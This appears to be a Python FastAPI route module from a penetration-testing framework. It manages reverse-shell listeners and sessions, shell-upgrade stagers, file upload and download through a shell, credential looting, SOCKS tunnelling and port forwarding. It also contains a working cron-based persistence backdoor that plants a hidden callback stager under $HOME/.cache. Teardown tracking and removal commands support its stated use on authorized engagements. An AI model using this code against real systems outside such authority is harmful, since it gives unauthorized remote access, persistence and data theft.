"""Shell-session routes: listeners, the session list, and the collaborative WebSocket
terminal. This is where the sessions core meets the engagement — the adoption hook links a
caught shell to its host and flips `access_gained`, and the WS carries the multiplayer
terminal (scrollback, live output, one-driver input, presence)."""
from __future__ import annotations

import base64
import re

from fastapi import Body, FastAPI, Header, HTTPException, WebSocket, WebSocketDisconnect

from ...sessions import tasking


def register_sessions_routes(app: FastAPI, ctx) -> None:
    mgr = ctx.sessions
    db_path = ctx.db_path
    broker = ctx.broker

    # --- engagement hook: caught shell → its host + the activity feed ------------
    def _link_host(session):
        import logging
        from ...store import Store
        from .. import collab
        try:
            with Store(db_path) as st:
                host = next((h for h in st.all_hosts() if h.ip == session.host_ip), None)
                label = (host.hostname or session.host_ip) if host is not None else session.host_ip
                if host is not None and not getattr(host, "access_gained", False):
                    host.access_gained = True
                    host.access_detail = "shell caught"
                    st.upsert_host(host, merge=True)
                collab.add_activity(st, "recce", "session", f"shell caught from {label}")
        except Exception:  # noqa: BLE001 — a hook must never break adoption
            logging.getLogger("recce.webui").debug("_link_host failed for %s", session.host_ip, exc_info=True)
        broker.publish({"type": "session", "event": "caught",
                        "ip": session.host_ip, "id": session.id})

    if _link_host not in mgr.hooks:
        mgr.hooks.append(_link_host)

    # push every session status change (catch / reconnect / drop) to the SSE broker so the
    # Sessions tab updates instantly instead of waiting for a poll
    mgr.on_change = lambda s: broker.publish(
        {"type": "session", "event": s.status, "id": s.id})

    # --- teardown checklist: everything recce deployed that a tester should
    # verify is cleaned up before closing out an engagement. Aggregates the
    # persistence table, uploads table, live listeners, live tunnels, and
    # active port-forwards into one view. All items already tracked
    # individually — this is a rollup, not a new source of truth. Powers the
    # `Teardown` panel in the UI and the pre-report safety check.
    @app.get("/api/teardown")
    def teardown_inventory():
        import time
        pers = mgr.store.list_persistence(active_only=True) if mgr.store else []
        ups = mgr.store.list_uploads(active_only=True) if mgr.store else []
        listeners = [{"id": l.id, "port": l.port, "kind": l.kind}
                     for l in mgr.listeners.values()]
        live_sessions = [{"id": s.id, "name": s.name, "host_ip": s.host_ip,
                          "kind": s.kind, "pty": s.pty}
                         for s in mgr.list() if s.status == "live"]
        tunnels: list[dict] = []
        portfwds: list[dict] = []
        # Tunnel + port-forward state is tracked on the session objects (they
        # were opened through a session), so reflect that.
        for s in mgr.list():
            if s.status != "live":
                continue
            try:
                from ...sessions import tunnel as _tunnel
                tstate = _tunnel.get_state(s.id) if hasattr(_tunnel, "get_state") else None
                if tstate and tstate.get("active"):
                    tunnels.append({"session_id": s.id, "host_ip": s.host_ip,
                                    "socks_port": tstate.get("socks_port")})
            except Exception:  # noqa: BLE001
                pass
        try:
            from ...sessions.tunnel import list_all_portfwds
            portfwds = list_all_portfwds() if callable(list_all_portfwds) else []
        except (ImportError, AttributeError):
            portfwds = []
        total = (len(pers) + len(ups) + len(listeners) + len(live_sessions)
                 + len(tunnels) + len(portfwds))
        return {
            "generated_at": time.time(), "total": total,
            "persistence": pers, "uploads": ups, "listeners": listeners,
            "sessions": live_sessions, "tunnels": tunnels, "portfwds": portfwds,
        }

    @app.post("/api/teardown/upload/{upload_id}/clear")
    def teardown_clear_upload(upload_id: str,
                              x_tester: str = Header(default="someone")):
        """Mark an uploaded file as cleared (tester ran the removal manually or
        deleted via the shell). Doesn't attempt to run anything on target —
        remote removal happens via the session's shell; this just records that
        the tester says it's done. Same pattern as persistence-mark-removed.
        Returns 404 on unknown upload_id so a UI stale on a purged row shows
        the mismatch clearly instead of a silent 200 no-op."""
        import time
        if mgr.store is None:
            raise HTTPException(500, "no store")
        if not mgr.store.mark_upload_cleared(upload_id, time.time()):
            raise HTTPException(404, "no such upload")
        broker.publish({"type": "teardown", "event": "upload-cleared",
                        "id": upload_id, "by": x_tester})
        return {"ok": True}

    # --- listeners ---------------------------------------------------------------
    @app.get("/api/listeners")
    def list_listeners():
        return [l.info() for l in mgr.listeners.values()]

    @app.post("/api/listeners")
    async def start_listener(body: dict = Body(default=None)):
        body = body or {}
        try:
            port = int(body.get("port", 0))
        except (TypeError, ValueError):
            raise HTTPException(400, "port must be an integer")
        if not (0 <= port <= 65535):
            raise HTTPException(400, "port out of range")
        tls = bool(body.get("tls", False))
        ssl_ctx = None
        if tls:
            try:
                from ...sessions.tlscert import server_ssl_context
                ssl_ctx = server_ssl_context(ctx.eng_dir)
            except Exception as e:  # noqa: BLE001 — openssl missing / cert failure
                raise HTTPException(500, f"could not set up TLS (is openssl installed?): {e}")
        try:
            lst = await mgr.start_listener(port, host=str(body.get("host", "0.0.0.0")),
                                           tls=tls, ssl_ctx=ssl_ctx)
        except OSError as e:
            raise HTTPException(409, f"could not bind: {e}")
        broker.publish({"type": "session", "event": "listener", "port": lst.port})
        return lst.info()

    @app.delete("/api/listeners/{listener_id}")
    async def stop_listener(listener_id: str):
        if not await mgr.stop_listener(listener_id):
            raise HTTPException(404, "no such listener")
        return {"ok": True}

    @app.get("/api/stager")
    def stager(tls: bool = False):
        """The robust reconnecting-PTY stager template (single source of truth — the browser
        fills {LHOST}/{PORT}/{TOKEN}). Same builder the auto-pivot injects, so no drift."""
        from ...sessions.stagers import stager_template
        return {"template": stager_template(tls)}

    # --- sessions ----------------------------------------------------------------
    @app.get("/api/sessions")
    def list_sessions(host: str = ""):
        items = mgr.list()
        if host:                                    # host drawer asks for one host's shells
            items = [s for s in items if s.host_ip == host]
        return [s.info() for s in items]

    @app.delete("/api/sessions/{session_id}")
    async def close_session(session_id: str):
        """Explicit session close — closes the transport, marks the session
        dead, and drops it from the registry. The transcript stays on disk
        (still downloadable via the export flow); only the live ring is gone."""
        if not await mgr.close_session(session_id):
            raise HTTPException(404, "no such session")
        broker.publish({"type": "session", "event": "closed", "id": session_id})
        return {"ok": True}

    @app.patch("/api/sessions/{session_id}")
    def patch_session(session_id: str, body: dict = Body()):
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if "label" in body:
            sess.label = str(body["label"])[:80]
            mgr._save(sess)
            broker.publish({"type": "session", "event": "label", "id": sess.id})
        return sess.info()

    @app.get("/api/sessions/{session_id}/transcript")
    def transcript(session_id: str):
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        # the COMPLETE history from disk (not just the live ring) so nothing is ever lost;
        # flush pending first so the very latest bytes are included
        mgr.flush_pending(session_id)
        full = mgr.store.load_transcript(session_id) if mgr.store else b""
        data = full or sess.scrollback()
        return {"id": session_id, "host_ip": sess.host_ip,
                "data": base64.b64encode(data).decode()}

    @app.post("/api/sessions/{session_id}/upgrade")
    async def upgrade(session_id: str):
        """Auto-pivot: push a reconnecting-PTY stager into a RAW shell so it upgrades itself
        into a robust session — no manual stabilize dance ('shell of a shell')."""
        import asyncio
        import uuid
        from ...sessions.stagers import upgrade_command
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if sess.pty:
            raise HTTPException(400, "already a robust PTY session")
        if not sess.connected:
            raise HTTPException(409, "shell is not currently connected")
        if not sess.local_addr or not sess.local_addr[1]:
            raise HTTPException(409, "cannot determine a callback address for this shell")
        lhost, port = sess.local_addr            # the exact endpoint the target already reached
        token = "up_" + uuid.uuid4().hex[:12]
        broker.publish({"type": "session", "event": "upgrading", "id": sess.id})
        # inject the stager and read the detection result (RECCE_UPGRADE_SENT / RECCE_NO_PYTHON)
        # detection echoes back fast on a live shell; the long tail is only a dead/hung shell
        out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
        cb = f"{lhost}:{port}"
        if b"RECCE_NO_METHOD" in out:
            return {"ok": True, "upgraded": False, "callback": cb,
                    "reason": "no python or bash on the target — use a manual payload from the catalog"}
        # wait for the upgraded shell to call back (a new session carrying our token — PTY
        # via python, or a reconnecting non-PTY shell via the bash fallback)
        for _ in range(20):                      # ~10s
            new = next((s for s in mgr.sessions.values()
                        if s.token == token and s.status == "live"), None)
            if new:
                return {"ok": True, "upgraded": True, "session_id": new.id,
                        "pty": new.pty, "callback": cb}
            await asyncio.sleep(0.5)
        return {"ok": True, "upgraded": False, "callback": cb,
                "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}

    @app.post("/api/sessions/{session_id}/spawn")
    async def spawn(session_id: str):
        """Spawn an additional independent session on the same host from an existing
        live shell — runs the stager in the background so both sessions coexist."""
        import asyncio
        import uuid
        from ...sessions.stagers import upgrade_command
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell is not currently connected")
        if not sess.local_addr or not sess.local_addr[1]:
            raise HTTPException(409, "cannot determine a callback address for this shell")
        lhost, port = sess.local_addr
        token = "sp_" + uuid.uuid4().hex[:12]
        out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
        cb = f"{lhost}:{port}"
        if b"RECCE_NO_METHOD" in out:
            return {"ok": False, "reason": "no python or bash on the target"}
        for _ in range(20):
            new = next((s for s in mgr.sessions.values()
                        if s.token == token and s.status == "live"), None)
            if new:
                return {"ok": True, "session_id": new.id, "pty": new.pty, "callback": cb}
            await asyncio.sleep(0.5)
        return {"ok": False, "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}

    async def _push_file(sess, remote_path: str, data: bytes) -> None:
        """Write bytes to a file on the target through the shell, chunked so no single line
        exceeds the PTY canonical-mode limit (~4 KB) — base64 in small appends, then decode.

        The whole sequence is bracketed by RECCE OOB markers so Session
        `_filter_oob` swallows both the multi-KB base64 chunks AND the
        PTY-echoed command lines that would otherwise flood the operator's
        terminal (previously visible as a giant IHOKCiMg... blob). The
        `''` split in the printf keeps the ECHOED command from containing
        the literal marker — only the printed OUTPUT does, which is what
        the filter's regex matches on."""
        import shlex, uuid
        q = shlex.quote(remote_path).encode()
        b64 = base64.b64encode(data)
        tag = uuid.uuid4().hex[:8].encode()
        # S marker + attempt to silence PTY input echo so echoed chunks
        # don't show even in the intra-marker payload (helps if a viewer
        # attaches mid-push and the whole block isn't in view yet).
        await sess.send(b"printf '__RECCE''_S_" + tag + b"__\\n'\n")
        await sess.send(b"stty -echo 2>/dev/null\n")
        await sess.send(b": > " + q + b".b64\n")            # truncate staging file
        for i in range(0, len(b64), 2048):
            await sess.send(b"printf '%s' '" + b64[i:i + 2048] + b"' >> " + q + b".b64\n")
        await sess.send(b"base64 -d " + q + b".b64 > " + q + b" && rm -f " + q + b".b64\n")
        await sess.send(b"stty echo 2>/dev/null\n")
        await sess.send(b"printf '__RECCE''_E_" + tag + b"__\\n'\n")

    # Quick recon commands testers run on every fresh shell. Kept as an allowlist
    # so this endpoint can never turn into an arbitrary-cmd runner (that lives at
    # /quickrun with its own tester-provided input) — a fixed catalog is what
    # justifies the "one-click" UX on the session card.
    _QUICK_ACTIONS = {
        "whoami":   "whoami",
        "id":       "id",
        "hostname": "hostname",
        "uname":    "uname -a",
        "sudo":     "sudo -n -l 2>&1 | head -30",
        "pwd":      "pwd",
        "os":       "cat /etc/os-release 2>/dev/null || uname -a",
        "ifconfig": "ip a 2>/dev/null || ifconfig 2>/dev/null",
        "ps":       "ps -eo user,pid,comm --no-headers 2>/dev/null | head -30",
        "netstat":  "ss -tlnp 2>/dev/null | head -30 || netstat -tlnp 2>/dev/null | head -30",
    }

    @app.get("/api/sessions/quick-actions")
    def quick_actions_catalog():
        """The names the UI renders as buttons. Kept in sync via one source of
        truth — the frontend never invents a name."""
        return {"actions": [{"key": k, "label": k, "cmd": v}
                            for k, v in _QUICK_ACTIONS.items()]}

    @app.post("/api/sessions/{session_id}/quick")
    async def quick_action(session_id: str, body: dict = Body()):
        """Run a pre-baked recon command on this session and return its output —
        no attach, no wheel-steal, no scrollback pollution. Backed by
        `run_and_capture` (marker-bounded, extraction is robust on an echoing PTY)."""
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        key = str(body.get("key", "")).strip()
        cmd = _QUICK_ACTIONS.get(key)
        if cmd is None:
            raise HTTPException(400, f"unknown quick action {key!r}")
        # No trailing newline here — run_and_capture already terminates the
        # wrapped command with \n. A stray newline splits the wrapper across
        # two shell lines and the end marker never runs (empty output bug).
        out = await sess.run_and_capture(cmd.encode(), timeout=15.0)
        return {"ok": True, "key": key, "cmd": cmd, "output": out.decode("utf-8", "replace")}

    @app.post("/api/sessions/{session_id}/quickrun")
    async def quickrun(session_id: str, body: dict = Body()):
        """One-shot arbitrary-command execution on this session — same non-attach
        contract as `/quick` but with a tester-typed command. Bounded by a short
        timeout so a runaway command can't hold the request open forever; long
        commands should be run via the actual terminal (attach)."""
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        cmd = str(body.get("cmd", "")).strip()
        if not cmd:
            raise HTTPException(400, "cmd required")
        if len(cmd) > 2000:
            raise HTTPException(400, "cmd too long (max 2000 chars)")
        # Same fix as /quick — no trailing \n (run_and_capture terminates
        # its wrapper itself).
        out = await sess.run_and_capture(cmd.encode(), timeout=20.0)
        return {"ok": True, "cmd": cmd, "output": out.decode("utf-8", "replace")}

    # Per-session command history (up-arrow across attaches / browsers)
    @app.get("/api/sessions/{session_id}/history")
    def get_history(session_id: str):
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if mgr.store is None:
            return {"history": []}
        return {"history": mgr.store.load_history(session_id)}

    @app.put("/api/sessions/{session_id}/history")
    def put_history(session_id: str, body: dict = Body()):
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if mgr.store is None:
            return {"ok": False, "reason": "store unavailable"}
        entries = body.get("entries") or []
        if not isinstance(entries, list):
            raise HTTPException(400, "entries must be a list")
        entries = [str(e)[:2000] for e in entries[-500:]]
        mgr.store.save_history(session_id, entries)
        return {"ok": True, "count": len(entries)}

    @app.post("/api/sessions/{session_id}/enum")
    async def run_enum(session_id: str, x_tester: str = Header(default="someone")):
        """Run recce's on-target enumeration THROUGH the shell and fold the output straight
        into the engagement — the deepest tie-in: a foothold becomes findings/privesc on its
        host, no copy-paste. Pushes recce-enum.sh, runs it, captures output, then `ingest`s it."""
        import os
        import tempfile
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        enum_sh = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                               "local", "recce-enum.sh")
        if not os.path.isfile(enum_sh):
            raise HTTPException(500, "recce-enum.sh not found")
        # push the enum script (chunked — avoids the PTY line limit), then run + capture.
        # bash (the script needs bashisms) piped through cat (so it doesn't colorize a tty).
        with open(enum_sh, "rb") as _fh:
            _enum_data = _fh.read()
        await _push_file(sess, "/tmp/.re.sh", _enum_data)
        out = await sess.run_and_capture(
            b"bash /tmp/.re.sh 2>/dev/null | cat; rm -f /tmp/.re.sh", timeout=240.0)
        if not out.strip():
            raise HTTPException(422, "enum produced no output (is /bin/sh / base64 present?)")
        # write the loot and fold it in via the same `ingest` pipeline imports use
        from ..jobs import recce_argv
        fd, tmp = tempfile.mkstemp(prefix="recce-sessenum-", suffix=".txt")

        def _done(job, _tmp=tmp):
            try:
                os.remove(_tmp)
            except OSError:
                pass
            broker.publish({"type": "scan", "status": job.status, "tester": x_tester,
                            "targets": f"ingest shell-enum {sess.host_ip}"})

        try:
            with os.fdopen(fd, "wb") as fh:
                fh.write(out)
            job = ctx.jobs.start(
                recce_argv("ingest", tmp, "-o", ctx.eng_dir, "--host", sess.host_ip),
                on_done=_done)
        except BaseException:
            try:
                os.remove(tmp)
            except OSError:
                pass
            raise
        broker.publish({"type": "session", "event": "enum", "id": sess.id})
        return {"ok": True, "mode": "job", "id": job.id, "bytes": len(out)}

    @app.post("/api/sessions/{session_id}/download")
    async def download(session_id: str, body: dict = Body(...)):
        """Pull a file off the target through the shell (base64 over the channel) and save it
        into the engagement's session-loot dir."""
        import os
        import shlex
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        path = str(body.get("path", "")).strip()
        if not path:
            raise HTTPException(400, "path required")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        out = await sess.run_and_capture(b"base64 " + shlex.quote(path).encode() + b" 2>/dev/null")
        cleaned = bytes(c for c in out if c not in b"\r\n \t")
        if not cleaned:
            raise HTTPException(422, "no data — file missing, unreadable, or base64 unavailable")
        try:
            raw = base64.b64decode(cleaned, validate=True)
        except Exception:
            raise HTTPException(422, "could not decode the transferred data")
        ddir = os.path.join(ctx.eng_dir, "session-loot")
        os.makedirs(ddir, exist_ok=True)
        # host_ip comes from the peer address today (safe), but sanitise anyway so
        # a future import path can't slip `..` into the destination.
        safe_ip = re.sub(r"[^0-9a-fA-F:.]+", "_", sess.host_ip)
        safe_name = os.path.basename(path) or "download"
        dest = os.path.join(ddir, f"{safe_ip}_{safe_name}")
        with open(dest, "wb") as f:
            f.write(raw)
        broker.publish({"type": "session", "event": "download", "id": sess.id})
        return {"ok": True, "saved": dest, "size": len(raw)}

    @app.post("/api/sessions/{session_id}/upload")
    async def upload(session_id: str, body: dict = Body(...),
                     x_tester: str = Header(default="someone")):
        """Push a file to the target through the shell (chunked base64 → base64 -d).
        Recorded in the uploads table so the teardown sweep can walk what was
        left on target — every file recce dropped is trackable + removable."""
        import time
        import uuid
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        path = str(body.get("path", "")).strip()
        data_b64 = str(body.get("data", ""))
        if not path or not data_b64:
            raise HTTPException(400, "path and data (base64) required")
        try:
            raw = base64.b64decode(data_b64, validate=True)
        except Exception:
            raise HTTPException(400, "data must be base64")
        if len(raw) > 5_000_000:
            raise HTTPException(413, "file too large (max ~5 MB)")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        await _push_file(sess, path, raw)           # chunked — safe past the PTY line limit
        if mgr.store is not None:
            mgr.store.add_upload({
                "id": uuid.uuid4().hex[:12], "host_ip": sess.host_ip,
                "remote_path": path, "bytes": len(raw),
                "uploaded_by": x_tester, "uploaded_at": time.time()})
        broker.publish({"type": "session", "event": "upload", "id": sess.id})
        return {"ok": True, "bytes": len(raw)}

    # --- persistence: the resilient service (INTRUSIVE — writes a backdoor; tracked+removable)
    @app.post("/api/sessions/{session_id}/persist")
    async def persist(session_id: str, body: dict = Body(default=None),
                      x_tester: str = Header(default="someone")):
        import shlex
        import time
        import uuid
        from ...sessions.stagers import python_stager
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        if not sess.local_addr or not sess.local_addr[1]:
            raise HTTPException(409, "cannot determine a callback address")
        body = body or {}
        if str(body.get("mechanism", "cron")) != "cron":
            raise HTTPException(400, "only the 'cron' mechanism is supported so far")
        lhost, lport = sess.local_addr
        pid = uuid.uuid4().hex[:10]
        marker = "rc" + pid
        # resolve $HOME so the artifact lands somewhere that survives a reboot (not /tmp)
        import re as _re
        home = (await sess.run_and_capture(b'printf %s "$HOME"')).strip().decode("ascii", "replace") or "/root"
        if not _re.fullmatch(r"/[A-Za-z0-9_./-]{1,200}", home):
            home = "/tmp"
        path = f"{home}/.cache/.{marker}"
        qpath = shlex.quote(path)
        await sess.send(b"mkdir -p " + shlex.quote(f"{home}/.cache").encode() + b"\n")
        await _push_file(sess, path, python_stager(lhost, lport, "ps_" + pid).encode())
        # cron: @reboot (survives reboot) + a */10 guard that relaunches only if it died
        cron = (f"# recce-persist {marker}\\n"
                f"@reboot (python3 {qpath} >/dev/null 2>&1 &)\\n"
                f"*/10 * * * * pgrep -f {marker} >/dev/null 2>&1 || (python3 {qpath} >/dev/null 2>&1 &)\\n")
        install = (f"(crontab -l 2>/dev/null; printf '{cron}') | crontab - 2>/dev/null "
                   "&& echo RECCE_PERSIST_OK || echo RECCE_PERSIST_FAIL")
        out = await sess.run_and_capture(install.encode(), timeout=10.0)
        ok = b"RECCE_PERSIST_OK" in out
        # the removal command is captured NOW, at install time, so cleanup never has to guess
        remove_cmd = (f"crontab -l 2>/dev/null | grep -v {marker} | crontab - 2>/dev/null; "
                      f"rm -f {qpath}; pkill -f {marker} 2>/dev/null; echo RECCE_UNPERSIST_OK")
        if mgr.store is not None:                 # record even on reported failure (artifacts may exist)
            mgr.store.add_persistence({
                "id": pid, "host_ip": sess.host_ip, "mechanism": "cron", "artifact_path": path,
                "remove_cmd": remove_cmd, "installed_by": x_tester, "installed_at": time.time(),
                "removed_at": None})
        from .. import collab
        from ...store import Store
        with Store(db_path) as st:
            collab.add_activity(st, x_tester, "add",
                                f"{x_tester} installed cron persistence on {sess.host_ip} (intrusive)")
        broker.publish({"type": "session", "event": "persist", "id": sess.id})
        if not ok:
            return {"ok": False, "id": pid,
                    "reason": "cron install reported failure (no crontab on the target?) — recorded for cleanup anyway"}
        return {"ok": True, "id": pid, "mechanism": "cron", "path": path}

    @app.get("/api/persistence")
    def list_persistence(host: str = ""):
        if mgr.store is None:
            return []
        return mgr.store.list_persistence(host_ip=host)

    @app.post("/api/persistence/remove-all")
    async def remove_all_persistence():
        """Engagement-end sweep: reverse every tracked backdoor across all hosts, and LOUDLY
        report any it couldn't reach (host offline → needs manual cleanup)."""
        import time
        if mgr.store is None:
            raise HTTPException(500, "no store")
        removed: list[str] = []
        failed: list[dict] = []
        for rec in mgr.store.list_persistence(active_only=True):
            target = next((s for s in mgr.sessions.values()
                           if s.host_ip == rec["host_ip"] and s.connected), None)
            if target is None:
                failed.append({"id": rec["id"], "host_ip": rec["host_ip"],
                               "path": rec["artifact_path"], "reason": "no live shell — MANUAL CLEANUP"})
                continue
            out = await target.run_and_capture(rec["remove_cmd"].encode(), timeout=10.0)
            if b"RECCE_UNPERSIST_OK" in out:
                mgr.store.mark_persistence_removed(rec["id"], time.time())
                removed.append(rec["id"])
            else:
                failed.append({"id": rec["id"], "host_ip": rec["host_ip"],
                               "path": rec["artifact_path"], "reason": "removal didn't confirm — verify by hand"})
        broker.publish({"type": "session", "event": "unpersist", "id": "all"})
        return {"removed": len(removed), "failed": failed}

    @app.post("/api/persistence/{pid}/remove")
    async def remove_persistence(pid: str):
        import time
        if mgr.store is None:
            raise HTTPException(500, "no store")
        rec = mgr.store.get_persistence(pid)
        if rec is None:
            raise HTTPException(404, "no such persistence record")
        if rec.get("removed_at"):
            return {"ok": True, "already_removed": True}
        # replay the exact removal through any live shell on that host
        target = next((s for s in mgr.sessions.values()
                       if s.host_ip == rec["host_ip"] and s.connected), None)
        if target is None:
            return {"ok": False, "reason": "no live shell on this host to run the removal — "
                    "reconnect a shell there, then remove"}
        out = await target.run_and_capture(rec["remove_cmd"].encode(), timeout=10.0)
        if b"RECCE_UNPERSIST_OK" not in out:
            return {"ok": False, "reason": "removal command didn't confirm — verify by hand"}
        mgr.store.mark_persistence_removed(pid, time.time())
        broker.publish({"type": "session", "event": "unpersist", "id": rec["host_ip"]})
        return {"ok": True, "id": pid}

    @app.post("/api/sessions/{session_id}/cred")
    def loot_cred(session_id: str, body: dict = Body(...),
                  x_tester: str = Header(default="someone")):
        """Fold a credential found in this shell into the store — auto-attributed to the
        session's host, so it lands in Loot and the spray plan (feeds the Act loop)."""
        from ...models import Credential
        from ...store import Store
        from .. import collab
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        user = str(body.get("username", "")).strip()
        secret = str(body.get("secret", "")).strip()
        if not user and not secret:
            raise HTTPException(400, "a username or secret is required")
        kind = str(body.get("kind", "password"))
        if kind not in ("password", "nthash", "hash", "blank"):
            kind = "password"
        with Store(db_path) as st:
            added = st.add_credential(Credential(
                username=user, secret=secret, kind=kind,
                domain=str(body.get("domain", "")), origin_ip=sess.host_ip,
                source="shell-session", notes=f"looted from shell on {sess.host_ip}"))
            collab.add_activity(st, x_tester, "add",
                                f"{x_tester} looted a credential from the shell on {sess.host_ip}")
        broker.publish({"type": "add", "what": "credential", "by": x_tester})
        return {"ok": True, "added": added}

    # --- reverse tunnel (SOCKS5 proxy through the shell) --------------------------
    @app.post("/api/sessions/{session_id}/tunnel")
    async def tunnel(session_id: str, body: dict = Body(...)):
        """Start, stop, or check a reverse SOCKS5 tunnel through a session."""
        from ...sessions.tunnel import start_tunnel, stop_tunnel, get_tunnel
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")

        action = str(body.get("action", "start"))

        if action == "status":
            state = get_tunnel(session_id)
            if state and state.alive:
                return {"active": True, "socks_port": state.socks_port,
                        "tunnel_port": state.tunnel_port, "agent_pid": state.agent_pid}
            return {"active": False}

        if action == "stop":
            ok = await stop_tunnel(session_id, sess,
                                   on_event=lambda e: broker.publish(e))
            return {"ok": ok}

        # action == "start"
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        socks_port = int(body.get("socks_port", 1080))
        try:
            state = await start_tunnel(sess, _push_file, socks_port=socks_port,
                                       on_event=lambda e: broker.publish(e))
        except RuntimeError as e:
            raise HTTPException(409, str(e))
        return {"ok": True, "socks_port": state.socks_port,
                "tunnel_port": state.tunnel_port, "agent_pid": state.agent_pid,
                "socks_addr": f"127.0.0.1:{state.socks_port}"}

    # --- port forwarding through the shell ----------------------------------------
    # In-memory tracking of active forwards per session (not persisted — a forward dies
    # with the shell). Each entry: {id, lport, rhost, rport, pid, method}.
    _portfwds: dict[str, list[dict]] = {}

    @app.post("/api/sessions/{session_id}/portfwd")
    async def portfwd(session_id: str, body: dict = Body(...)):
        """Start or stop a TCP port forward on the target through the shell.

        Start: runs a background socat (preferred) or Python TCP relay on the target,
        making remote_host:remote_port accessible on the target at 0.0.0.0:listen_port.
        The operator then reaches it via target_ip:listen_port.

        This is the simplest useful forward — it makes internal services reachable from
        the operator's box through the compromised host, with zero extra tooling."""
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")

        action = str(body.get("action", "start"))

        if action == "list":
            return {"forwards": _portfwds.get(session_id, [])}

        if action == "stop":
            fwd_id = str(body.get("id", ""))
            fwds = _portfwds.get(session_id, [])
            fwd = next((f for f in fwds if f["id"] == fwd_id), None)
            if not fwd:
                raise HTTPException(404, "no such forward")
            await sess.send(f"kill {fwd['pid']} 2>/dev/null; kill -9 {fwd['pid']} 2>/dev/null\n".encode())
            _portfwds[session_id] = [f for f in fwds if f["id"] != fwd_id]
            broker.publish({"type": "session", "event": "portfwd_stop", "id": sess.id})
            return {"ok": True}

        # action == "start"
        lport = int(body.get("listen_port", 0))
        rhost = str(body.get("remote_host", "127.0.0.1")).strip()
        rport = int(body.get("remote_port", 0))
        if not (1 <= lport <= 65535) or not (1 <= rport <= 65535) or not rhost:
            raise HTTPException(400, "listen_port, remote_host, remote_port required (1-65535)")

        import uuid
        fwd_id = uuid.uuid4().hex[:8]
        marker = f"rcfwd_{fwd_id}"

        # try socat first, fall back to Python
        socat_cmd = (
            f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{rhost}:{rport} &"
            f" RCPID=$!; echo {marker}_PID_$RCPID"
        )
        py_cmd = (
            f"python3 -c '"
            f"import socket,threading,os,sys;"
            f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
            f"s.bind((\"0.0.0.0\",{lport}));s.listen(8);"
            f"def b(a,c):\n"
            f" try:\n"
            f"  while 1:\n"
            f"   d=a.recv(4096)\n"
            f"   if not d:break\n"
            f"   c.sendall(d)\n"
            f" except:pass\n"
            f" a.close();c.close()\n"
            f"while 1:\n"
            f" c,_=s.accept()\n"
            f" try:r=socket.create_connection((\"{rhost}\",{rport}))\n"
            f" except:c.close();continue\n"
            f" threading.Thread(target=b,args=(c,r),daemon=1).start()\n"
            f" threading.Thread(target=b,args=(r,c),daemon=1).start()\n"
            f"' &"
            f" RCPID=$!; echo {marker}_PID_$RCPID"
        )

        # detect socat availability
        check = await sess.run_and_capture(b"command -v socat >/dev/null 2>&1 && echo SOCAT_OK || echo SOCAT_NO", timeout=5.0)
        has_socat = b"SOCAT_OK" in check

        cmd = socat_cmd if has_socat else py_cmd
        method = "socat" if has_socat else "python"

        out = await sess.run_and_capture(cmd.encode(), timeout=8.0)
        # extract PID from marker
        pid = ""
        for line in out.decode("ascii", "replace").split("\n"):
            if f"{marker}_PID_" in line:
                pid = line.split(f"{marker}_PID_")[1].strip()
                break

        if not pid:
            return {"ok": False, "reason": f"could not start {method} forwarder (port {lport} may be in use)"}

        fwd_entry = {"id": fwd_id, "lport": lport, "rhost": rhost, "rport": rport,
                     "pid": pid, "method": method}
        _portfwds.setdefault(session_id, []).append(fwd_entry)
        broker.publish({"type": "session", "event": "portfwd_start", "id": sess.id})
        return {"ok": True, **fwd_entry}

    # --- the collaborative terminal (WebSocket) ---------------------------------
    @app.websocket("/api/sessions/{session_id}/attach")
    async def attach(ws: WebSocket, session_id: str):
        await ws.accept()
        sess = mgr.get(session_id)
        if sess is None:
            await ws.send_json({"t": "error", "msg": "no such session"})
            await ws.close()
            return
        tester = ws.query_params.get("tester", "someone")

        q = sess.subscribe()
        sess.attach(tester)
        # replay scrollback, then current presence, then stream live
        await ws.send_json({"t": "scrollback",
                            "data": base64.b64encode(sess.scrollback()).decode()})
        await ws.send_json({"t": "presence", "driver": sess.driver,
                            "attached": sorted(sess.attached)})

        import asyncio

        async def pump_out():
            while True:
                env = await q.get()
                if env["t"] == "out":
                    await ws.send_json({"t": "out",
                                        "data": base64.b64encode(env["data"]).decode()})
                else:
                    await ws.send_json(env)     # status / presence pass through

        out_task = asyncio.ensure_future(pump_out())
        try:
            while True:
                msg = await ws.receive_json()
                t = msg.get("t")
                if t == "in" and sess.driver == tester:
